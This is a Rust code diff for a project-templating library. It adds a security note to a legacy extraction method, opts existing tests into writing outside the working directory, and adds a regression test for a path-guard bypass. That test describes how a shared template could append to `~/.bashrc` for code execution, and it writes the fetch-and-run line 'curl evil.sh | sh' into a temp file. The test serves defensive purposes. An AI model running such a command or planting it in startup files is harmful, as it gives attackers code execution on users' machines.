@@ -665,16 +665,32 @@ impl Template {
         Ok((rendered, undo, project_root))
     }
 
-    /// Legacy extraction method for backwards compatibility with CLI and tests.
+    /// Legacy extraction method for backwards compatibility with tests and
+    /// older library callers.
     ///
     /// Builds an interactive [`Context`] from `keywords`, runs
     /// [`Template::extract_with_context`], and copies every keyword resolved
     /// during rendering (prompts, JSON lookups) back into the caller's map.
+    ///
+    /// # Security
+    ///
+    /// For backwards compatibility this shim does **not** enforce the
+    /// outside-the-working-directory guard: it is equivalent to
+    /// [`Context::allow_outside(true)`](Context::allow_outside), so an absolute
+    /// or `..` destination is written without objection. The CLI does not use
+    /// this method. When rendering a template you did not author (shared,
+    /// downloaded, or built with `--from-github`), use
+    /// [`Template::extract_with_context`] with the default
+    /// `allow_outside(false)` so that a template cannot write outside the
+    /// working directory.
     pub fn extract(
         &mut self,
         keywords: &mut HashMap<String, String>,
     ) -> std::result::Result<(), String> {
-        let context = Context::from(keywords.clone());
+        // Preserve the historically permissive behaviour of this deprecated
+        // shim; the escape guard is enforced on the `extract_with_context`
+        // path, which is what the CLI and modern callers use.
+        let context = Context::from(keywords.clone()).allow_outside(true);
         let (_rendered, resolved_keywords, _undo, _project_root) =
             self.extract_inner(&context).map_err(|e| e.to_string())?;
 
@@ -1799,12 +1815,17 @@ Status: {{{{$.status[0]}}}}
             "clobbered",
         ));
 
-        let ctx = Context::new().non_interactive();
+        // Absolute tempdir path, so allow_outside(true) to exercise the
+        // FileExists guard rather than the escape guard.
+        let ctx = Context::new().non_interactive().allow_outside(true);
         let err = template.extract_with_context(&ctx).unwrap_err();
         assert!(matches!(err, Error::FileExists(ref files) if files.len() == 1));
         assert_eq!(fs::read_to_string(&target).unwrap(), "precious");
 
-        let ctx = Context::new().non_interactive().force(true);
+        let ctx = Context::new()
+            .non_interactive()
+            .force(true)
+            .allow_outside(true);
         template.extract_with_context(&ctx).unwrap();
         assert_eq!(fs::read_to_string(&target).unwrap(), "clobbered");
     }
@@ -1830,7 +1851,10 @@ Status: {{{{$.status[0]}}}}
                 "brand new",
             ));
 
-        let ctx = Context::new().non_interactive().force(true);
+        let ctx = Context::new()
+            .non_interactive()
+            .force(true)
+            .allow_outside(true);
         let (_rendered, undo, _root) = template.extract_with_undo(&ctx).unwrap();
 
         // Both writes happened.
@@ -1873,9 +1897,10 @@ Status: {{{{$.status[0]}}}}
             .with_mode(FileMode::Append),
         );
 
-        // No force needed; append is non-destructive.
+        // No force needed; append is non-destructive. allow_outside(true)
+        // because the target is an absolute tempdir path.
         template
-            .extract_with_context(&Context::new().non_interactive())
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap();
 
         assert_eq!(
@@ -1901,7 +1926,7 @@ Status: {{{{$.status[0]}}}}
         );
 
         let err = template
-            .extract_with_context(&Context::new().non_interactive())
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap_err();
         assert!(
             matches!(err, Error::PatchApply { .. }),
@@ -1926,7 +1951,7 @@ Status: {{{{$.status[0]}}}}
             );
 
         let err = template
-            .extract_with_context(&Context::new().non_interactive())
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap_err();
         assert!(matches!(err, Error::PatchApply { .. }), "got {err:?}");
         assert!(
@@ -1950,7 +1975,7 @@ Status: {{{{$.status[0]}}}}
             .with_file(File::create(path, "two").with_mode(FileMode::Append));
 
         template
-            .extract_with_context(&Context::new().non_interactive())
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap();
 
         assert_eq!(fs::read_to_string(&target).unwrap(), "base\none\ntwo");
@@ -1969,7 +1994,7 @@ Status: {{{{$.status[0]}}}}
                 .with_marker("rules"),
         );
 
-        let ctx = Context::new().non_interactive();
+        let ctx = Context::new().non_interactive().allow_outside(true);
         template.extract_with_context(&ctx).unwrap();
         // Applying the same template again must not duplicate the block.
         template.extract_with_context(&ctx).unwrap();
@@ -1993,7 +2018,10 @@ Status: {{{{$.status[0]}}}}
                 .with_position(Position::After),
         );
 
-        let ctx = Context::new().with_var("SECTION", "net").non_interactive();
+        let ctx = Context::new()
+            .with_var("SECTION", "net")
+            .non_interactive()
+            .allow_outside(true);
         template.extract_with_context(&ctx).unwrap();
 
         assert_eq!(
@@ -2025,7 +2053,7 @@ Status: {{{{$.status[0]}}}}
             );
 
         template
-            .extract_with_context(&Context::new().non_interactive())
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap();
 
         assert_eq!(
@@ -2072,7 +2100,7 @@ Status: {{{{$.status[0]}}}}
         );
 
         template
-            .extract_with_context(&Context::new().non_interactive())
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap();
 
         assert_eq!(fs::read_to_string(&target).unwrap(), "version = 2\n");
@@ -2094,7 +2122,7 @@ Status: {{{{$.status[0]}}}}
         assert_eq!(template.files.as_ref().unwrap()[0].mode(), FileMode::Append);
 
         template
-            .extract_with_context(&Context::new().non_interactive())
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap();
         assert_eq!(fs::read_to_string(&target).unwrap(), "first\nsecond");
     }
@@ -2112,7 +2140,9 @@ Status: {{{{$.status[0]}}}}
             .with_file(File::create(fresh.to_string_lossy().to_string(), "new"))
             .with_file(File::create(existing.to_string_lossy().to_string(), "x"));
 
-        let ctx = Context::new().non_interactive();
+        // allow_outside(true) so this exercises the FileExists guard, not the
+        // escape guard (the targets are absolute tempdir paths).
+        let ctx = Context::new().non_interactive().allow_outside(true);
         assert!(template.extract_with_context(&ctx).is_err());
         assert!(
             !fresh.exists(),
@@ -2139,6 +2169,50 @@ Status: {{{{$.status[0]}}}}
             .extract_with_context(&Context::new().non_interactive().allow_outside(true))
             .unwrap();
         assert!(dir.join("escaped.txt").exists());
+    }
+
+    /// Regression for the path-guard hole: an **absolute** destination in
+    /// **append** mode used to slip through both guards — the escape guard only
+    /// rejected `..`, and patch/append modes are exempt from the FileExists
+    /// guard. A shared template could therefore append to `~/.bashrc` and get
+    /// code execution on the next shell start. The absolute path must now be
+    /// refused with `UnsafePath` unless `allow_outside` is set, and the
+    /// existing file must be left untouched.
+    #[test]
+    fn extract_rejects_absolute_append_target_unless_allowed() {
+        let dir_tmp = tempfile::tempdir().unwrap();
+        let dir = dir_tmp.path().to_path_buf();
+        let victim = dir.join("bashrc");
+        fs::write(&victim, "# existing\n").unwrap();
+
+        // Absolute path (no `..`) + append mode — the exact bypass.
+        let template = Template::builder().with_file(
+            File::create(victim.to_string_lossy().to_string(), "curl evil.sh | sh")
+                .with_mode(FileMode::Append),
+        );
+
+        let err = template
+            .extract_with_context(&Context::new().non_interactive())
+            .unwrap_err();
+        assert!(
+            matches!(err, Error::UnsafePath(_)),
+            "absolute append target must be refused, got {err:?}"
+        );
+        assert_eq!(
+            fs::read_to_string(&victim).unwrap(),
+            "# existing\n",
+            "the victim file must not be touched when the write is refused"
+        );
+
+        // With the opt-in it goes through, proving the guard is the only thing
+        // that was stopping it.
+        template
+            .extract_with_context(&Context::new().non_interactive().allow_outside(true))
+            .unwrap();
+        assert_eq!(
+            fs::read_to_string(&victim).unwrap(),
+            "# existing\ncurl evil.sh | sh"
+        );
     }
 
     #[test]
